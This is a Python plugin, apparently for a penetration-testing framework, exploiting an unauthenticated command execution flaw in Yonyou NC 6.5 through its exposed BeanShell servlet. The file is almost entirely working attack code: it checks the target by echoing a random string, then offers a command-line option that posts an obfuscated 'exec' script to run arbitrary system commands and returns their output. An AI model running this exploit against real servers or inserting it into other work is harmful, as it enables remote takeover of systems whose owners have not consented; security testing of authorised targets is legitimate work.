# -*-* coding:UTF-8
import re
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "用友NC命令执行漏洞",
        "version": "用友NC: 6.5",
        "description": "由于用友NC对外开放了BeanShell接口，攻击者可以在无需经过身份验证的情况下直接访问该接口，并构造恶意数据执行任意命令，攻击成功可获得目标服务器权限。",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        res = self.exec_cmd(self.target.value, f'echo {random_str}')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './servlet/~ic/bsh.servlet.BshServlet'),
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            },
            data=f"bsh.script=\u0065\u0078\u0065\u0063%28%22{cmd}%22%29%3B%0D%0A&bsh.servlet.output=raw",
            timeout=15
        )
        if r.status_code == 200:
            match = re.search('<pre>(.*?)</pre>', r.text)
            if match:
                return match[1]
